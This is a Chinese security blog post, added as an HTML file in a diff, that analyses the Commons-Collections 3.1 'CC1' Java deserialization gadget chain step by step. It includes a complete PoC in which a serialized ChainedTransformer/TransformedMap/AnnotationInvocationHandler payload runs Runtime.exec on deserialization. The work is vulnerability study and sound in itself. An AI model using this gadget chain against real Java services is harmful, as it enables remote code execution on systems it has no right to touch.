@@ -1,0 +1,242 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>CC1利用链分析 | 藏青&#39;s BLOG</title>
+
+  
+  <meta name="author" content="藏青">
+  
+
+  
+  <meta name="description" content="知行合一">
+  
+
+  
+  <meta name="keywords" content="渗透 内网 代码审计">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="CC1利用链分析"/>
+
+  <meta property="og:site_name" content="藏青&#39;s BLOG"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">藏青&#39;s BLOG</a>
+    </h1>
+    <p class="site-description"></p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">Home</a></li>
+      
+        <li><a href="/archives">Archives</a></li>
+      
+        <li><a href="/categories">Categories</a></li>
+      
+        <li><a href="/links">Links</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>CC1利用链分析</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/10/23/CC1利用链分析/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-10-23T03:47:04.000Z">
+          2021-10-23
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <pre><code>这个利用链小兄弟们都分析过了，所以我大概了解下。主要是解决我看到这个利用链的一些疑惑。这条利用链的POC如下。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">       <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">       Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">               <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">               new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),</span><br><span class="line">               new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;),</span><br><span class="line">               new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"calc.exe"&#125;)</span><br><span class="line">       &#125;;</span><br><span class="line">       <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">       Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">       Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">       innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">       <span class="comment">//给予map数据转化链</span></span><br><span class="line">       Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">       <span class="comment">//反射机制调用AnnotationInvocationHandler类的构造函数</span></span><br><span class="line">       Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">       Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">       <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">       ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">       <span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line">       Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">outerMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">       FileOutputStream f = <span class="keyword">new</span> FileOutputStream(<span class="string">"xxx.bin"</span>);</span><br><span class="line">       ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(f);</span><br><span class="line">       fout.writeObject(instance);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">       FileInputStream fi = <span class="keyword">new</span> FileInputStream(<span class="string">"xxx.bin"</span>);</span><br><span class="line">       ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(fi);</span><br><span class="line">       <span class="comment">//服务端反序列化</span></span><br><span class="line">       fin.readObject();</span><br></pre></td></tr></table></figure>
+
+<h2 id="问题一：什么是Transformer？"><a href="#问题一：什么是Transformer？" class="headerlink" title="问题一：什么是Transformer？"></a>问题一：什么是Transformer？</h2><p>​        Transformer顾名思义是<code>转换器</code>，Transformer提供了一个transform方法，可以将我们传入的对象转换成其他对象。当然，Transformer仅仅是一个接口，具体转换的逻辑是由其实现类来处理的。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603145710604.png" alt="image-20210603145710604"></p>
+<p>​        在<code>commons-collections</code>中，有多个Transformer的实现类，不同的Transformer实现不同的转换逻辑。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603145939944.png" alt="image-20210603145939944"></p>
+<h2 id="问题二：POC中的Transformer是做什么的？"><a href="#问题二：POC中的Transformer是做什么的？" class="headerlink" title="问题二：POC中的Transformer是做什么的？"></a>问题二：POC中的Transformer是做什么的？</h2><p><strong>ConstantTransformer</strong></p>
+<p>​        在构造方法上，接收传入的对象并保存到iConstant中，当调用transform时，无论传入什么对象，均返回iConstant存储的对象。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603150440833.png" alt="image-20210603150440833"></p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603150957826.png" alt="image-20210603150957826"></p>
+<p><strong>InvokerTransformer</strong></p>
+<p>​        InvokerTransformer则是漏洞最终触发的原因，在InvokerTransformer的transform方法中，通过反射调用任意类的任意非private方法。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603151358735.png" alt="image-20210603151358735"></p>
+<p>​        假如我们想通过反射调用Runtime类的exec方法执行命令,可以使用下面的代码。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer inv=new InvokerTransformer("exec",new Class[] &#123;String.class&#125;,new Object[]&#123;"calc.exe"&#125;);</span><br><span class="line">inv.transform(Runtime.getRuntime());</span><br></pre></td></tr></table></figure>
+
+<p><strong>ChainedTransformer</strong></p>
+<p>​        ChainedTransformer接收一个transformer数组，通过for循环调用每个transformer的transform方法，并将前一个transformer的转换结果作为后一个转换的输入。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210604092936963.png" alt="image-20210604092936963"></p>
+<h2 id="问题三：如何调用到InvokerTransformer的transform方法？"><a href="#问题三：如何调用到InvokerTransformer的transform方法？" class="headerlink" title="问题三：如何调用到InvokerTransformer的transform方法？"></a>问题三：如何调用到InvokerTransformer的transform方法？</h2><p><strong>思路一：直接找到某个重写了readObject的类，并且这个类里调用了transform方法</strong></p>
+<p>​        我找了<code>commons-collections</code>中所有的readObject方法，并没有找到一个调用了transform方法的实现。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603154324813.png" alt="image-20210603154324813"></p>
+<p><strong>思路二：找到一个间接调用了transform方法的类，再去看有没有readObject方法调用了那个类对应的方法</strong></p>
+<p>​        首先看哪些方法里调用了transform方法，并且调用transform方法的方法名不能是transform。</p>
+<p>​        找到了下面的方法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;java&#x2F;Commons-collection&#x2F;commons-collections-3.1&#x2F;src&#x2F;java&#x2F;org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;functors&#x2F;TransformerPredicate.java:72</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603155206279.png" alt="image-20210603155206279"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:&#x2F;程序源码&#x2F;java&#x2F;Commons-collection&#x2F;commons-collections-3.1&#x2F;src&#x2F;java&#x2F;org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;BeanMap.java:746</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603155343226.png" alt="image-20210603155343226"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:&#x2F;程序源码&#x2F;java&#x2F;Commons-collection&#x2F;commons-collections-3.1&#x2F;src&#x2F;java&#x2F;org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;CollectionUtils.java:625</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603155403993.png" alt="image-20210603155403993"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:&#x2F;程序源码&#x2F;java&#x2F;Commons-collection&#x2F;commons-collections-3.1&#x2F;src&#x2F;java&#x2F;org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;comparators&#x2F;TransformingComparator.java:70</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603155431558.png" alt="image-20210603155431558"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:&#x2F;程序源码&#x2F;java&#x2F;Commons-collection&#x2F;commons-collections-3.1&#x2F;src&#x2F;java&#x2F;org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;functors&#x2F;TransformedPredicate.java:79</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603155553227.png" alt="image-20210603155553227"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:&#x2F;程序源码&#x2F;java&#x2F;Commons-collection&#x2F;commons-collections-3.1&#x2F;src&#x2F;java&#x2F;org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;functors&#x2F;TransformerClosure.java:71</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603155737775.png" alt="image-20210603155737775"></p>
+<p>​        太多了，实在不想手工去搞这件事情。其实这里思路总的来说还比较清晰，但是一个一个去找并且手工递归，确实比较浪费时间，终于知道为什么要搞利用链自动挖掘的工具了。如果要搞的话，直接找从transform到readObject的链，分析其中的链就好了。网上已经有大佬开发好了自动找调用链的工具<code>https://github.com/wh1t3p1g/tabby</code>根据需求修改就好了。</p>
+<h2 id="问题四：为什么不能直接调用InvokerTransformer触发？"><a href="#问题四：为什么不能直接调用InvokerTransformer触发？" class="headerlink" title="问题四：为什么不能直接调用InvokerTransformer触发？"></a>问题四：为什么不能直接调用InvokerTransformer触发？</h2><p>​        在commons-collection1利用链中，作者找到了<code>org.apache.commons.collections.map.TransformedMap#checkSetValue--》sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>的利用链。</p>
+<p>​        checkSetValue方法代码如下，当我们给valueTransformer传入InvokerTransformer对象，并给value传入<code>Runtime.getRuntime()</code>即可触发漏洞。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603180335946.png" alt="image-20210603180335946"></p>
+<p>​        给valueTransformer赋值可通过<code>org.apache.commons.collections.map.TransformedMap#TransformedMap</code>构造方法实现。value的值取决于调用checkSetValue方法传入的参数。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603180645251.png" alt="image-20210603180645251"></p>
+<p>​        在<code>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#setValue</code>调用了checkSetValue，并且传入了value的值。parent的值可以通过<code>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.MapEntry#MapEntry</code>构造器来设置。所以可以创建一个TransformedMap对象，设置到MapEntry中。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603183358188.png" alt="image-20210603183358188"></p>
+<p>​        如何调用到MapEntry的setValue方法？这条利用链的作者最终找到<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>,这里虽然var5的值可以通过memberValues属性获取，但是setValue的参数是<code>AnnotationTypeMismatchExceptionProxy</code>类型，这显然和我们的预期不符。所以不能通过给setValue传值的方式来利用。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210603195031969.png" alt="image-20210603195031969"></p>
+<p>​        当然还有另一个原因，再回头看看直接使用InvokerTransformer执行命令的代码，要执行命令需要得到Runtime对象，而Runtime对象并没有实现<code>Serializable</code>接口，是不能通过序列化进行传输的。所以要想通过反序列化漏洞触发Commons-Collection1利用链，只能让程序在反序列化的过程中动态去生成Runtime对象进行命令执行。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer inv=new InvokerTransformer("exec",new Class[] &#123;String.class&#125;,new Object[]&#123;"calc.exe"&#125;);</span><br><span class="line">inv.transform(Runtime.getRuntime());</span><br></pre></td></tr></table></figure>
+
+<h2 id="问题五：为什么不能直接new一个AnnotationInvocationHandler对象？"><a href="#问题五：为什么不能直接new一个AnnotationInvocationHandler对象？" class="headerlink" title="问题五：为什么不能直接new一个AnnotationInvocationHandler对象？"></a>问题五：为什么不能直接new一个AnnotationInvocationHandler对象？</h2><p>​        这里AnnotationInvocationHandler构造方法为defalut权限，只有在类内部和同一个包下，才可以调用该构造方法，因此无法通过new的方式创建AnnotationInvocationHandler对象。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210604095030138.png" alt="image-20210604095030138"></p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210604094821863.png" alt="image-20210604094821863"></p>
+<h2 id="问题六：为什么要使用ChainedTransformer？"><a href="#问题六：为什么要使用ChainedTransformer？" class="headerlink" title="问题六：为什么要使用ChainedTransformer？"></a>问题六：为什么要使用ChainedTransformer？</h2><p>​        首先，这个漏洞最终能够造成命令执行，是通过反射调用了Runtime.exec方法，而且通过前面的分析，无法直接获取Runtime对象。只能在程序反序列化的过程中，生成Runtime对象并执行对应的exec方法。首先了解下正常情况下，如何通过反射获取Runtime对象并执行exec方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;            Class&lt;Runtime&gt; run=Runtime<span class="class">.<span class="keyword">class</span></span>;            Method method=run.getMethod(<span class="string">"getRuntime"</span>);            Runtime r=(Runtime) method.invoke(<span class="keyword">null</span>);            Method method2=run.getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;            String s=<span class="string">"calc.exe"</span>;            method2.invoke(r,s);        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;            e.printStackTrace();        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;            e.printStackTrace();        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;            e.printStackTrace();        &#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        再想想<code>org.apache.commons.collections.functors.InvokerTransformer#transform</code>执行命令的方法。我们的输入是一个Runtime对象才能直接造成命令执行，但在反序列化中又不能传递Runtime对象，所以需要通过反射来得到Runtime对象，而我们目前能控制参数、调用方法、调用类的反射只有<code>org.apache.commons.collections.functors.InvokerTransformer#transform</code>方法，所以我们需要找到一种方式，能够将通过<code>org.apache.commons.collections.functors.InvokerTransformer#transform</code>反射调用得到的Runtime对象又作为输入传递给<code>org.apache.commons.collections.functors.InvokerTransformer#transform</code>，也就是可以循环调用transform的方法。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210604180704500.png" alt="image-20210604180704500"></p>
+<p>​        搜索了整个Commons-Collections项目，只有ChainedTransformer满足这个条件，所以可以使用ChainedTransformer将命令执行的代码串起来。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210604181740785.png" alt="image-20210604181740785"></p>
+<h2 id="问题七：如何使用ChainTransformer得到Runtime对象？"><a href="#问题七：如何使用ChainTransformer得到Runtime对象？" class="headerlink" title="问题七：如何使用ChainTransformer得到Runtime对象？"></a>问题七：如何使用ChainTransformer得到Runtime对象？</h2><p>​        首先虽然Runtime对象不能通过序列化传输，但是Runtime的class对象是可以作为参数传输的，所以我们可以以Runtime.class为一个起点，下一步是通过什么方式传递Runtime的class对象，再想想，我们在反序列化的过程中，可以直接控制变量的属性，至于执行某个方法的参数，我们是不能直接传进去的，只能通过控制变量的属性来间接影响调用方法传递的参数，所以我们需要找到一个transformer，可以让我们通过控制它的属性作为初始化参数。通过寻找找到<code>org.apache.commons.collections.functors.ConstantTransformer#ConstantTransformer</code>，可以通过构造函数对iConstant属性赋值，并在transform方法调用时返回该对象， 所以可以使用ConstantTransformer来进行初始化操作。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210605102032164.png" alt="image-20210605102032164"></p>
+<p>​        所以已经找到一个给<code>org.apache.commons.collections.functors.InvokerTransformer#transform</code>进行初始化的方法了，下一步需要通过调用Runtime的getRuntime方法来得到Runtime对象。当传入一个Class对象，我们只能调用这个Class对象里的任意方法，所以可以先调用Class对象的getMethod方法，获取getRuntime方法的Method对象，再去调用这个Method对象的Invoke方法，就可以拿到Runtime对象，再通过调用Runtime对象的exec方法执行命令，所以ChainTransformer可以这样构造。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers &#x3D; new Transformer[] &#123;                new ConstantTransformer(Runtime.class), &#x2F;&#x2F;作为初始化得到Runtime的Class对象。                new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;&quot;getRuntime&quot;, new Class[0] &#125;),&#x2F;&#x2F;调用Class对象的getMethod方法获取getRuntime的Method对象。                new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), &#x2F;&#x2F;通过调用Method的Invoke方法得到Runtime对象。                new InvokerTransformer(&quot;exec&quot;, new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)        &#125;;</span><br></pre></td></tr></table></figure>
+
+<h2 id="问题八：为什么最终还可以通过setValue来进行触发？"><a href="#问题八：为什么最终还可以通过setValue来进行触发？" class="headerlink" title="问题八：为什么最终还可以通过setValue来进行触发？"></a>问题八：为什么最终还可以通过setValue来进行触发？</h2><p>​        在问题四中我们分析过，setValue虽然可以控制调用的对象，但是setValue的参数无法控制，因此站在我们的角度来讲已经放弃了这条链，但是为什么可以打通呢？因为在调用ConstantTransformer的transform时，transform传入什么值，返回的都是ConstantTransformer构造方法中传递的属性，所以transform传入的参数对我们来说是无关的。</p>
+<h2 id="问题九：如何构造POC"><a href="#问题九：如何构造POC" class="headerlink" title="问题九：如何构造POC?"></a>问题九：如何构造POC?</h2><p>​        首先ChainedTransformer对象我们在问题七里已经构建好了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>), //作为初始化得到<span class="title">Runtime</span>的<span class="title">Class</span>对象。</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[0] &#125;),//调用Class对象的getMethod方法获取getRuntime的Method对象。</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[0] &#125;), //通过调用Method的Invoke方法得到Runtime对象。</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"calc.exe"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">ChainTransformer chain=<span class="keyword">new</span> ChainTransformer(transformers);</span><br></pre></td></tr></table></figure>
+
+<p>​        参考问题四的分析，接下来我们要创建一个TransformedMap对象，并将Chains设置到该对象中,但是TransformedMap的构造方法并非Public类型，所以不能直接调用构造方法来 为valueTransformer赋值。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210605105743462.png" alt="image-20210605105743462"></p>
+<p>​        但在decorate方法中，会调用该构造方法，所以可以通过调用decorate来间接调用TransformedMap的构造方法。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210605105902495.png" alt="image-20210605105902495"></p>
+<p>​        并且调用decorate还需要传递一个Map对象，所以我们需要提前创建好一个实现了Serializable接口的Map对象，这里随便找了个IdentityHashMap。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map innerMap = <span class="keyword">new</span> IdentityHashMap();Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br></pre></td></tr></table></figure>
+
+<p>​        在看看<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>方法，我们需要将我们构建好的Map赋值给AnnotationInvocationHandler的memberValue属性，并且要给Map赋值，否则在进行遍历的时候会出错。所以还要给map赋值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">outerMap.put(&quot;test666&quot;, &quot;test666&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210605110708972.png" alt="image-20210605110708972"></p>
+<p>​        下面我们要创建AnnotationInvocationHandler对象，之前已经分析过，不能直接通过New来创建对象，并且也没有找到调用AnnotationInvocationHandler构造方法的方法，所以 只能通过反射调用来创建AnnotationInvocationHandler对象。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>); <span class="comment">//得到AnnotationInvocationHandler的Class对象</span></span><br><span class="line">Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;<span class="comment">//获取构造器</span></span><br><span class="line">ctor.setAccessible(<span class="keyword">true</span>); <span class="comment">//设置构造器的权限</span></span><br><span class="line">Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">outerMap</span>)</span>; <span class="comment">//创建AnnotationInvocationHandler实例并将outerMap赋值给memberValues属性。</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="问题十：如何给MapEntry的parent属性赋值？"><a href="#问题十：如何给MapEntry的parent属性赋值？" class="headerlink" title="问题十：如何给MapEntry的parent属性赋值？"></a>问题十：如何给MapEntry的parent属性赋值？</h2><p>​        通过之前的分析，这个漏洞还有一个重点在于给MapEntry的parent属性赋值为我们构造好的TransformedMap，但是在我们构造的POC中并没有给parent属性赋值的操作，是什么时候给parent属性赋值的。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210605140831584.png" alt="image-20210605140831584"></p>
+<p>​            在<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>中，有如下代码<code>Iterator var4 = this.memberValues.entrySet().iterator();</code>会对我们传入的TransformedMap对象做处理。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210605141151339.png" alt="image-20210605141151339"></p>
+<p>​        首先调用了TransformedMap的entrySet()方法，而TransformedMap并没有定义entrySet方法，因此会调用TransformedMap父类，也就是AbstractInputCheckedMapDecorator的entrySet方法，这个方法会将TransformedMap对象传递给EntrySet的构造方法的第二个参数中。EntrySet会将TransformedMap对象设置到this.parent中。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210605141558046.png" alt="image-20210605141558046"></p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210605141709529.png" alt="image-20210605141709529"></p>
+<p>​        当调用<code>org.apache.commons.collections.map.AbstractInputCheckedMapDecorator.EntrySet#iterator</code>方法时，会将TransformedMap传递到EntrySetIterator的构造方法中，给<code>this.patent</code>赋值、</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210605142139720.png" alt="image-20210605142139720"></p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210605142241893.png" alt="image-20210605142241893"></p>
+<p>​        当调用next方法时，会创建MapEnry并将我们构造好的TransformedMap对象赋值给MapEnry的parent属性。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210605142309628.png" alt="image-20210605142309628"></p>
+<h2 id="问题十一：这条利用链为什么不能再JDK8中使用？"><a href="#问题十一：这条利用链为什么不能再JDK8中使用？" class="headerlink" title="问题十一：这条利用链为什么不能再JDK8中使用？"></a>问题十一：这条利用链为什么不能再JDK8中使用？</h2><p>​        查看JDK8中<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject</code>方法，在该方法中，已经不会去调用setValue方法了，所以这条利用链就失效了。</p>
+<p><img src="/2021/10/23/CC1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210605112848120.png" alt="image-20210605112848120"></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+      
+
+    <span class="post-categories">
+      <i class="icon-categories"></i>
+        <a href="/categories/反序列化/">反序列化</a>
+    </span>
+    
+
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+  
+
+
+
+
+
+
+    </main>
+
+    <footer class="site-footer">
+  <p class="site-info">
+    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
+    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
+    </br>
+    
+    &copy; 2021 藏青
+    
+  </p>
+</footer>
+    
+    
+  </div>
+</div>
+</body>
+</html>
